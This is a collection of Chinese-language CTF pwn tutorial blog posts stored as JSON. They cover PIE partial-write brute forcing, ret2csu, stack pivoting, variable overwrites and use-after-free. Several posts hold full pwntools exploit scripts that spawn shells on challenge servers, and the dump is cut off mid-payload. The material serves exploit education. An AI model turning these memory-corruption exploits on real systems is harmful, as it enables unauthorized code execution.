}","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"简单爆破partial write","slug":"简单爆破partial-write","date":"2022-10-06T09:23:02.000Z","updated":"2023-09-14T17:18:18.000Z","comments":true,"path":"2022/10/06/简单爆破partial-write/","link":"","permalink":"http://example.com/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/","excerpt":"","text":"原理分析本篇介绍ret2text的一种特殊情况 先前我们学习过的是没有pie的情况下 这时候我们backdoor函数的地址清清楚楚 我们可以直接栈溢出覆盖 控制程序执行流 但是如果开了pie呢？ 这样的话后门函数的地址就随机化了 我们通过ida只能得知其与基址的偏移 如上图所示 这样的情况下 我们又该如何得知backdoor函数的真实返回地址呢？ 不知道你还记不记得我们曾经讲过虚拟内存分页机制 其导致了基址的后三位一定为000 所以函数的地址后三位保持不变 不会因为pie的开启而变化 所以： 我们假设程序的基址是0xfffffffffffff000 那么函数的偏移是0x0000 其除了后四位 其他位和基址是一样的(不排除进一的情况) 而程序正常结束后的ret 其地址也是基址+偏移得到的 所以，我们在已经直到后三位的情况下 要想得知后门函数的真实地址 只需要爆破倒数第四位 就可以试出来了 真题解析 int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); puts(&quot;Do you konw ret2text?&quot;); puts(&quot;It&#x27;s a easy challenge&quot;); vuln(); puts(&quot;You failed.&quot;); return 0;&#125; __int64 vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF read(0, buf, 0x140uLL); return 0LL;&#125; int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125; 最简单的栈溢出到后门函数 唯一不同的是开启了pie需要爆破倒数第四位的地址 直接上exp吧 from pwn import*def exploit(): io = remote(&quot;43.143.7.97&quot;,28774) io.recvuntil(&quot;It&#x27;s a easy challenge&quot;) payload = cyclic(0x100+0x8) payload += p16(0x11e2) io.send(payload) io.recv() io.sendline(&quot;cat flag&quot;) result = io.recv(timeout=1) io.interactive()if __name__ == &#x27;__main__&#x27;: try_count = 0 while(True): try: exploit() except: try_count += 1 print(&quot;failed :&#123;&#125;&quot;.format(try_count)) 这里你会发现后三位的地址有点不一样 后门函数的后三位是1DD 但是exp上写的是1e2 这里是栈对齐的问题 因为开启了pie 又没办法泄露基址 所以我们无法获得ret的汇编地址 这里看一下汇编代码 就比较好理解了 我们相当于是跳过了push rbp这一指令 因为此时的rbp已经被我们填入的垃圾数据覆盖了 如果这时候将rbp入栈 就会破坏原有的栈结构 至于为什么在没有开启pie的ret2text的题目中不用注意这一点 只能解释说这是pie特有的需要注意的情况 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"HNCTF2022.ret2csu","slug":"HNCTF2022-ret2csu","date":"2022-10-06T08:50:29.000Z","updated":"2023-09-14T17:19:16.000Z","comments":true,"path":"2022/10/06/HNCTF2022-ret2csu/","link":"","permalink":"http://example.com/2022/10/06/HNCTF2022-ret2csu/","excerpt":"","text":"看一下保护机制 再拖到ida里看一下 int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0LL); setbuf(stderr, 0LL); setbuf(_bss_start, 0LL); write(1, &quot;Start Your Exploit!\\n&quot;, 0x14uLL); vuln(); return 0;&#125; ssize_t vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF write(1, &quot;Input:\\n&quot;, 7uLL); read(0, buf, 0x200uLL); return write(1, &quot;Ok.\\n&quot;, 4uLL);&#125; 主体部分非常简洁 但是没有任何后门函数和泄露真实地址的地方 一开始我们会想自己构造rop链 通过ROPgadget来寻找rdi rsi rdx三个寄存器的传参汇编地址 我们来看一下能否找到我们想要的汇编 可以看到并没有rdx 但是仍然还存在一种可能，我们gdb看一下当我们read数据的时候 rdx寄存器的值是多少 可以看到是0x4 显然没有办法成为我们调用wirte函数的参数(因为其是作为第三个参数size存在的，这样我们只能输出4个字节的数据) 所以此时我们回忆一下，有没有什么万能的rop链？欸 一想还真有 叫ret2csu(相关的介绍在栈部分里有) .text:0000000000401290 loc_401290: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000401290 mov rdx, r14.text:0000000000401293 mov rsi, r13.text:0000000000401296 mov edi, r12d.text:0000000000401299 call ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8].text:000000000040129D add rbx, 1.text:00000000004012A1 cmp rbp, rbx.text:00000000004012A4 jnz short loc_401290.text:00000000004012A6.text:00000000004012A6 loc_4012A6: ; CODE XREF: __libc_csu_init+35↑j.text:00000000004012A6 add rsp, 8.text:00000000004012AA pop rbx.text:00000000004012AB pop rbp.text:00000000004012AC pop r12.text:00000000004012AE pop r13.text:00000000004012B0 pop r14.text:00000000004012B2 pop r15.text:00000000004012B4 retn 我们再看一下程序给了我们哪些函数 那么思路直接有了 这里用write函数 然后通过csu汇编代码将参数传给寄存器 这样我们就能泄露出write函数的真实地址了(也可以是其他的) 泄露出来以后 就是ret2libc的知识点了 思路捋清了 直接看exp吧 from pwn import*io = remote(&quot;43.143.7.97&quot;,28657)libc = ELF(&quot;libc.so.6&quot;)elf = ELF(&quot;./ret2csu&quot;)gadget2_addr = 0x4012A6gadget1_addr = 0x401290vuln_addr = 0x401176rdi_addr = 0x4012b3write_got = elf.got[&#x27;write&#x27;]io.recvuntil(&quot;Input:&quot;)payload1 = cyclic(0x100+0x8)+p64(gadget2_addr)+cyclic(8)+p64(0)+p64(1)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(gadget1_addr)+cyclic(56)+p64(vuln_addr)io.sendline(payload1)io.recvuntil(&quot;Ok.\\n&quot;)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]hex(libc_addr)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]hex(system_addr)binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))hex(binsh_addr)io.recvuntil(&quot;Input:\\n&quot;)payload2 = cyclic(0x108)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)io.sendline(payload2)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"栈溢出-特殊情况","slug":"栈溢出-特殊情况","date":"2022-10-03T03:25:33.000Z","updated":"2023-09-14T17:18:36.000Z","comments":true,"path":"2022/10/03/栈溢出-特殊情况/","link":"","permalink":"http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/","excerpt":"","text":"本篇博客用来记录一种特殊的情况 直接上例题吧 看完就知道什么意思了 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4[56]; // [esp+4h] [ebp-38h] BYREF printf(&quot;Qual a palavrinha magica? &quot;, v4[0]); gets(v4); return 0;&#125; void __cdecl get_flag(int a1, int a2)&#123; int v2; // esi unsigned __int8 v3; // al int v4; // ecx unsigned __int8 v5; // al if ( a1 == 814536271 &amp;&amp; a2 == 425138641 ) &#123; v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;); v3 = getc(v2); if ( v3 != 255 ) &#123; v4 = (char)v3; do &#123; putchar(v4); v5 = getc(v2); v4 = (char)v5; &#125; while ( v5 != 255 ); &#125; fclose(v2); &#125;&#125; 总体的思路应该就是最简单的栈溢出控制程序执行流到getflag这个函数 但是getflag在open flag.txt前有一个if判定 我们要先使a1 a2的值符合这个条件 才能使函数正常运行 但是这个a1 a2我们发现也没有办法通过栈溢出的方法来覆盖使其变成符合条件的值 所以这里只能在调用getflag函数时 一并传入a1 a2的值 exp如下： from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29661)getflag_addr = 0x80489a0exit_addr = 0x804e6a0payload = cyclic(0x38)+p32(getflag_addr)+p32(exit_addr)+p32(0x308CD64F)+p32(0x195719D1)io.sendline(payload)io.interactive() 这里你会发现 按照平常我们填充的垃圾数据应该是 变量到ebp的距离0x38+0x4来覆盖ebp 这里为什么我们没有多一个字长的垃圾数据呢？ 来看一下main函数的汇编情况 是不是缺少了什么？ 如果你对栈帧的概念不是很清楚 可能看不出什么 我们再放一段正常的函数汇编代码 如果你熟悉栈帧的概念(这个我们在ret2csu里有讲到) 你就会知道大部分栈帧在生成的时候都会有这两段汇编代码 用来使esp和ebp入栈 但是这道题的getflag函数并没有ebp 他利用esp寻址的办法 所以此时我们的变量距离ret addr只有0x38字节 而非0x38+4 再说回为什么函数和参数之间的垃圾数据要为exit函数的地址 这是因为程序如果是以异常状况结束的 那么他将不会有回显 也就是说open(flag)得到的flag并不会显示出来 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"溢出覆盖变量","slug":"溢出覆盖变量","date":"2022-10-02T16:55:35.000Z","updated":"2023-09-14T17:18:34.000Z","comments":true,"path":"2022/10/03/溢出覆盖变量/","link":"","permalink":"http://example.com/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/","excerpt":"","text":"其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧 我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数据 通常我们都是用一些没有意义的垃圾数据去覆盖他 但是有些题目 就可能会故意刁难我们 比如下面这题 是吧 他都把var[13]赋值为了0 结果要var[13]&gt;0并且&#x3D;17才能达到我们系统调用的目的 这怎么整？ 我们唯一的输入点就在第十行 其中肯定有漏洞 %s 读入字符串数据 注意这里的是%s 我们刚开始提到的干货就是这个 ps:这里我也理解不了 感兴趣的可以自己看大佬博客： pwn中str()与p64() - ATKevin - 博客园 (cnblogs.com) 不然就是记个结论 %s就得用p32&#x2F;p64 传输数据 也就是说我们在覆盖var[13]时 需要注意不能用b””或者是str() 说回题目 scanf没有对输入的字节长度进行限制 存在了栈溢出漏洞 我们只需要用垃圾数据填充var数组的前13个数据 然后用17填充var[13] 当然 这里还得注意一下 char类型的数组的每个值都是一个字节长度的 而这题并不是char类型的数组 所以我们应该用一个字长去覆盖一个数组元素 所以这里我们的payload应该写成 payload = cyclic(13*4)+p32(17) 当然也可以写成 payload = p32(1)*13+p32(17) 这样我们就成功覆盖了var[13]的值为17了 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"UAF","slug":"UAF","date":"2022-10-01T13:10:23.000Z","updated":"2023-09-14T17:20:52.000Z","comments":true,"path":"2022/10/01/UAF/","link":"","permalink":"http://example.com/2022/10/01/UAF/","excerpt":"","text":"TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了 UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧 就是当我们把一个chunk释放之后 再利用他 怎么做到这一点？ #include &lt;stdio.h&gt;#include &lt;cstdlib&gt;#include &lt;string.h&gt;int main()&#123; char *p1; p1 = (char *) malloc(sizeof(char)*10);//申请内存空间 memcpy(p1,&quot;hello&quot;,10); printf(&quot;p1 addr:%x,%s\\n&quot;,p1,p1); free(p1);//释放内存空间 char *p2; p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存 memcpy(p1,&quot;world&quot;,10);//对内存进行修改 printf(&quot;p2 addr:%x,%s\\n&quot;,p2,p1);//验证 return 0;&#125; 放一段代码 应该很好看懂吧 先申请一个chunk 然后打印出指向这个chunk的指针的值 再释放这个chunk 接着再申请一个 最后再打印出新申请的chunk的指针的值 我们会发现这二者都是一样的值 说明什么？ 如果只是单纯的free chunk的话 没有去清空指向被free的这个chunk的指针 那么这个指针仍然可以指向这个free chunk 概念介绍到这边 应该就可以大部分理解了 如果你需要更加详细的介绍 可以看下面这篇文章 (3条消息) UAF (Use After Free)漏洞分析及利用_4ct10n的博客-CSDN博客_uaf 真题复现1说真的 光uaf的题型就有好多种出法 想了想 还是拿nisa 21届校赛的题来当第一道例题 这道题的引导性个人认为十分不错 同时讲解起来也方便理解 checksec看一下保护机制和位数 发现是32位的 那么接下来的一些数据就得注意了 拖到ida里面看看main函数 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3[4]; // [esp+8h] [ebp-10h] BYREF v3[1] = __readgsdword(0x14u); setbuf(stdin, 0); setbuf(stdout, 0); while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;1.create&quot;); puts(&quot;2.edit&quot;); puts(&quot;3.delete&quot;); puts(&quot;4.show&quot;); putchar(58); __isoc99_scanf(&quot;%d&quot;, v3); if ( v3[0] != 2 ) break; edit(); &#125; if ( v3[0] &gt; 2 ) &#123; if ( v3[0] == 3 ) &#123; del(); &#125; else if ( v3[0] == 4 ) &#123; show(); &#125; else &#123;LABEL_13: puts(&quot;Invalid choice&quot;); &#125; &#125; else &#123; if ( v3[0] != 1 ) goto LABEL_13; create(); &#125; &#125;&#125; int create()&#123; int result; // eax int v1; // ebx char *v2; // eax printf(&quot;you are creating the %d page\\n&quot;, i); result = i; if ( i &gt;= 0 ) &#123; result = i; if ( i &lt;= 9 ) &#123; v1 = i; (&amp;page)[v1] = malloc(8u); if ( i ) &#123; if ( i &lt;= 0 || i &gt; 9 ) &#123; result = puts(&quot;NO PAGE&quot;); &#125; else &#123; puts(&quot;Good cretation!&quot;); result = ++i; &#125; &#125; else &#123; v2 = page; *page = 1868654951; v2[4] = 0; *(page + 1) = echo; puts(&quot;The init page&quot;); result = ++i; &#125; &#125; &#125; return result;&#125; unsigned int edit()&#123; int v1; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); puts(&quot;Input page&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 0 || v1 &gt; i ) &#123; puts(&quot;NO PAGE&quot;); &#125; else &#123; puts(&quot;Input your strings&quot;); __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]); &#125; return __readgsdword(0x14u) ^ v2;&#125; unsigned int del()&#123; int v1; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); puts(&quot;Input page&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt; 0 || v1 &gt; i ) puts(&quot;NO PAGE&quot;); else free((&amp;page)[v1]); return __readgsdword(0x14u) ^ v2;&#125; unsigned int show()&#123; int v1; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); puts(&quot;Input page&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 ) &#123; if ( v1 &lt;= 0 || v1 &gt; i ) puts(&quot;NO PAGE&quot;); else echo((&amp;page)[v1]); &#125; else &#123; (*(page + 1))(page); &#125; return __readgsdword(0x14u) ^ v2;&#125; 看蒙蔽了是不是 没关系 接下来 我们将花费足够的时间以及耐心来为你分析透彻这些代码 目光聚集到main函数 堆的经典菜单题 看懂不成问题吧 输入对应的数字跳转进对应的函数 按照顺序我们先看create函数 第一遍我们先粗略的遍历一遍这个函数的作用 有一点小不同 其他题目可能还需要我们输入index来创建一个chunk 但是这题是用++i的办法来自己设置index 可以看到创建的chunk大小固定为0x8 接着看第二个箭头指向的代码 *()就是指这个地址的内容 假设哈 假设page &#x3D; 0x1000 你可能以为page+1的结果会是0x1001 其实不是 这里的1是指一个字长 也就是说结果其实是0x1004 那么这段代码的意思也就是说 page地址的下一个字长的内容更改为echo这个函数 然后我们点进去看一下这个函数是干什么的 int __cdecl echo(char *s)&#123; return puts(s);&#125; puts 有点东西是不是 不过我们先放着 再看一下edit函数 这个函数内容不用说看名字也懂干什么的吧 就是输入你要编辑的index数 然后再输入要更改的内容 这里用到了scanf 这个函数没有限制输入字长 我们栈溢出的常客是不是 所以这里也能来个溢出？ 对了 有这个想法 这题你能看到曙光了 我们再回想一下 上一个函数create 指针所指向的下一个字长处是不是一个echo函数 欸 是吧 替换addr来控制程序执行流我们再熟悉不过了 不过先别激动 还有一个函数没看呢(delete我也解释不来 你就知道他free了chunk但是没有清空指针的内容就行了) 看到那个if判定了吗 如果我们只设置一个chunk 那么我们想要show这个chunk还不行 因为index不能为0 所以我说这道题的引导性其实是很好的 他驱使你去进行uaf 所以我们的思路是什么 先创建一个page0的chunk 然后把他free了 接着创建一个page1的chunk 由于page0被释放后会被存入fast bin 此时申请的page1大小小于等于page0 所以page0就被重新分配给了page1 他们两个共享一个空间 指针指向的地址相同 这里就利用了uaf 那么我们之前看到的edit函数又该如何利用呢？再接着看show函数图上的第二个箭头 这句代码的作用是什么？ 先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数 看到这里你就能懂了吧 所以当我们不对chunk内容进行任何溢出时 当我们仅仅只是输入小于一个字长的数据时 show函数就相当于调用了echo函数把chunk的内容puts了出来 所以此时我们的思路就立马清晰了 我们用edit函数修改chunk的内容为 “sh\\x00\\x00” 然后溢出到下一个字长 修改其内容为system的地址 这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数 因此我们成功实现了系统调用 这里再解释一下为什么是 sh\\x00\\x00 因为是32位的程序嘛 一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够 所以使用sh也能达成对应的操作 至于后面的两个\\x00 显然是为了填充字节 又不至于破坏sh字符串 所以最后我们的exp是： from pwn import*io = remote(&quot;1.14.71.254&quot;,28340)def add(): io.recvuntil(&quot;:&quot;) io.sendline(&quot;1&quot;)def edit(id,content): io.recvuntil(&quot;:&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;Input page\\n&quot;) io.sendline(str(id)) io.recvuntil(&quot;Input your strings\\n&quot;) io.sendline(content)def delete(id): io.recvuntil(&quot;:&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;Input page\\n&quot;) io.sendline(str(id))def show(id): io.recvuntil(&quot;:&quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;Input page\\n&quot;) io.sendline(str(id))io.recvuntil(&quot;4.show&quot;)add()delete(0)add()payload = b&quot;sh\\x00\\x00&quot;len(payload)payload +=p32(0x8048642)edit(1,payload)show(0)io.interactive() ps:从堆开始 我们将会频繁使用python中的def 因为菜单题的重复接收输送实在是太多了 如果看不懂这样书写的语法 可以自行百度学习 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"复制粘贴问题解决","slug":"复制粘贴问题解决","date":"2022-09-30T02:51:22.000Z","updated":"2023-09-14T17:17:56.000Z","comments":true,"path":"2022/09/30/复制粘贴问题解决/","link":"","permalink":"http://example.com/2022/09/30/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"Ubuntu20.04无法安装vmtools 或者出现安装了也没办法做到物理机和虚拟机复制粘贴共用 所以这里我们用open-vm-tools 这是一个vmtools官方承认的开源工具 其一样可以起到vmtools的作用 第一步输入下面的指令 sudo apt-get autoremove open-vm-tools 第二步我们输入 sudo apt-get install open-vm-tools-desktop 但是很遗憾 会出现这样的问题 这时候我们需要更改一下下载源 网上的方法是说在这里搜索software-update 但是我查看了以后发现找不到 最后找到的解决办法是 因为还没有安装输入法 所以只能先输入set 然后打开设置 一直向下滑 直到看到关于 点进去 找到软件更新 再点进去 如图所示 点开后选择other(也可能显示成其他 看你刚创建虚拟机时的语言选择) 这里挑一个选 我选择的是阿里云的 ! 退出的时候会提醒你这个 直接点重新载入就好了 在终端中输入 sudo apt-get update 然后我们再输入 sudo apt-get install open-vm-tools-desktop 发现就可以了 安装完成之后 在终端输入 reboot 重启一下虚拟机 发现就可以做到物理机和虚拟机复制粘贴互通了 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"栈迁移","slug":"栈迁移","date":"2022-09-26T13:40:18.000Z","updated":"2023-09-14T17:18:36.000Z","comments":true,"path":"2022/09/26/栈迁移/","link":"","permalink":"http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决 今天所要讲到的内容，也是和栈溢出字节数不够有关 当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？ 我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置 但是其本质上 ebp和esp并没有被我们所控制，他仍然是按照原先栈底的汇编代码所运行的 所以我们换个思路？不妨劫持esp和ebp，让他们前往bss段或者其他可以供我们自由写入的区 这样我们就可以自己构建一个后门函数，并且将程序执行流引导至其 那问题就来到了如何劫持esp和ebp 我们先得清楚一下栈帧这个概念 栈帧栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构 简单理解就是每次函数的调用，都会生成自己的栈帧 栈帧就相当于函数的调用框架，包含了函数的参数，函数的局部变量，函数执行完后的返回地址 系统是如何定义一个栈帧的？ebp指向了栈帧的栈底，esp指向了函数的栈顶 也就是说，我们把esp和ebp劫持的目的，就是让系统错以为我们写入shellcode的bss段(包括但不限)是一个栈帧 从而执行他 栈迁移原理归根到底，就是要如何劫持esp和ebp 回到我们最开始的栈溢出，我们要溢出的字节数&#x3D;变量var距离esp的字节数+一个字长 这里的一个字长覆盖的是ebp 在我们没有对ebp覆盖的时候，其保存的是上层函数的栈底地址，而ret addr保存的是上层函数执行到了哪个地方，方便子函数结束后返回父函数最后执行的地方 在一个栈帧结束的时候，eip 即将执行 leave 与 ret 两条指令恢复现场(即返回父函数) leave指令相当于 mov esp ebp和pop ebp 他将ebp和esp指向同一地址，这一步相当于腾出了栈帧空间 随后pop ebp 将此时esp指向的old ebp(因为我们上面说过了嘛，ebp保存的是上层函数的栈底地址)赋值给真正的ebp(此时的ebp是定义栈帧栈底的ebp) 是不是有点晕？首先你要分清楚ebp保存的内容和ebp寄存器这两个概念 在子函数调用开始之前，系统会将父函数栈底的地址弹出到新的栈帧，这个值就是ebp(就是我们之前栈溢出用垃圾数据覆盖的那个嘛) 然后记录下当前父函数运行到的地址，将其弹出为ret addr，等子函数结束以后，就会返回到这个地址 所以说，如果我们覆盖ebp的时候不用垃圾数据，而是放入我们要使ebp迁移到的地址，那么ebp就会被我们挟持走 但是此时还有个esp寄存器怎么办？栈帧的空间需要这二者才能定义 你还记不记得我们构造rop链的手法？我们自己再找一个leave的汇编代码地址然后覆盖ret addr不就好了？ 此时mov esp ebp会起到什么效果？ebp已经指向了我们要迁移的地址，所以esp也被挟持到了那边 但是注意，还有一句pop ebp 虽然这句没有任何作用，因为此时新的栈帧的栈顶，其保存的已经是我们要挟持到的地方的地址 但是这一句是出栈指令，此时我们的esp，他指向的地址就会增加一个字长 如图所示，HijackAddr就是我们想要劫持esp ebp到的地址 那栈迁移运作的原理我们已经搞清楚了是吧，接下来想办法构造payload payload &#x3D; cyclic(offset)+pxx(addr)+pxx(leave_addr) 这一个没有问题吧 那只剩下最后一个问题了，我们迁移到的那个地址的栈内容要怎么编写 aaaa是我们最开始的那个地址存放的垃圾数据，即上文说到的HijackAddr,因为pop ebp的原因，esp会指向高一个字长的地方 dddd则是32位情况下的传参，中间要隔个垃圾数据，这没什么好说的 下一个binsh_addr 和binsh字符串是什么意思，当程序连binsh都没给我们的话，反正我们都能自己编写一段栈帧了，我们不是可以自己写入一段binsh，然后我们也知道其地址了，不是就能调用了 后面的old_ebp和ret_addr也没什么好说的，就是一段栈帧必须的要素 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"ret2csu","slug":"ret2csu","date":"2022-09-25T06:47:11.000Z","updated":"2023-09-14T17:20:26.000Z","comments":true,"path":"2022/09/25/ret2csu/","link":"","permalink":"http://example.com/2022/09/25/ret2csu/","excerpt":"","text":"我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接 不一定有那么刚好的汇编代码可以供我们构造rop链 今天我们了解的这种方法，将不受动态链接或者静态链接的限制 我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言) 那么这个函数究竟有什么奇效，让我们可以做到随意构造rop链呢？ 来看看在ida中，这个函数是什么样子的 .text:00000000004011B0 ; void _libc_csu_init(void).text:00000000004011B0 public __libc_csu_init.text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:00000000004011B0 ; __unwind &#123;.text:00000000004011B0 push r15.text:00000000004011B2 mov r15, rdx.text:00000000004011B5 push r14.text:00000000004011B7 mov r14, rsi.text:00000000004011BA push r13.text:00000000004011BC mov r13d, edi.text:00000000004011BF push r12.text:00000000004011C1 lea r12, __frame_dummy_init_array_entry.text:00000000004011C8 push rbp.text:00000000004011C9 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004011D0 push rbx.text:00000000004011D1 sub rbp, r12.text:00000000004011D4 sub rsp, 8.text:00000000004011D8 call _init_proc.text:00000000004011DD sar rbp, 3.text:00000000004011E1 jz short loc_4011FE.text:00000000004011E3 xor ebx, ebx.text:00000000004011E5 nop dword ptr [rax].text:00000000004011E8.text:00000000004011E8 loc_4011E8: ; CODE XREF: __libc_csu_init+4C↓j.text:00000000004011E8 mov rdx, r15.text:00000000004011EB mov rsi, r14.text:00000000004011EE mov edi, r13d.text:00000000004011F1 call qword ptr [r12+rbx*8].text:00000000004011F5 add rbx, 1.text:00000000004011F9 cmp rbp, rbx.text:00000000004011FC jnz short loc_4011E8.text:00000000004011FE.text:00000000004011FE loc_4011FE: ; CODE XREF: __libc_csu_init+31↑j.text:00000000004011FE add rsp, 8.text:0000000000401202 pop rbx.text:0000000000401203 pop rbp.text:0000000000401204 pop r12.text:0000000000401206 pop r13.text:0000000000401208 pop r14.text:000000000040120A pop r15.text:000000000040120C retn.text:000000000040120C ; &#125; // starts at 4011B0.text:000000000040120C __libc_csu_init endp 我们的目光聚集到loc_4011FE和loc_4011E8 我们暂且把loc_4011E8命名为gadget1，把loc_4011FE命名为gadget2 由于逻辑顺序的原因，所以我们这里先介绍gadget1 可以看到他先将rsp的位置增加8个字节，这8个字节尤为关键，我们下面再进行解释 接着他pop了多个寄存器，但是仍然没有我们需要的rdi和rsi，不过先别急，再往下想想 最后一行有个retn，我们可以利用这个ret将返回地址修改为gadget2，用意在你看完整个的流程分析后就会明白 再把目光看到gadget2 mov指令将r15和r14以及r13的数据分别传给了寄存器rdx，rsi和edi，这样子实际上就实现了我们要调用函数首先要做到的传参 这里解释一下edi，我们之前不是说过在64位的情况下，是r开头的吗，其实情况也不是绝对的 64位情况下的edi只能改写rdi低32位字节的数据，高32位的字节是无法更改的，不过此时rdi的高32位的数据为0，并不影响我们更改rdi的值 接下来的call指令就是重头戏，可以看到他call的值是r12+rbx*8 有没有一种可能，如果我们把rbx赋值为0，而把r12赋值为我们想要执行的函数地址(为什么不反过来，一是*8转化不方便，还有一个原因下面讲到)，那么我们就可以实现函数调用 接着对rbx进行了+1的操作 而我们上面讲到，我们准备把rbx的值设置为0，所以此时的rbx就为1 cmp对于rbx和rbp二者进行了对比，如果二者相同，则不进行下一条指令，也就是jnz的跳转，即重新执行一次刚才的汇编代码 所以此时我们需要将rbp的值设置为1，才能使其于rbx相等 收回思绪，我们接着想，程序执行完gadget2后会怎么样？ 其实没有多高深的想法，他会按照顺序接着执行下去，那么又回到了我们的gadget1 接下来，由于我们已经实现了我们想要的寄存器传参，所以此时的寄存器是什么值我们已经不在乎了 我们可以简单的用cyclic(8*7)简单的实现填充垃圾数据，然后在末尾的ret在自行决定我们接下来要返回的地址 缕清楚了整个__libc_csu_init函数的思路，我们来回顾一下刚才提出的问题，rsp+8会怎么影响我们的程序，我们来用图表示一下栈结构试试看 第一行和第二行以及第三行没有什么好解释的 常规的栈溢出 然后控制返回地址使程序返回到libc_csu_init函数 此时的sp指针，是指向到了add rsp+8这行汇编代码，+8即让其继续向栈顶增进了一个字长，所以此时我们要在add rsp+8该行汇编代码处填充的数值，可以是任何，即垃圾数据 那么，总结一下，我们可以得出一个通用的payload payload = offset * &#x27;a&#x27; #栈溢出的垃圾数据字节数payload += p64(gagdet2_addr) + &#x27;a&#x27; * 8 #gadgets2的地址payload += p64(0) + p64(1)#rbx=0, rbp=1payload += p64(r12)#call调用的地址payload += 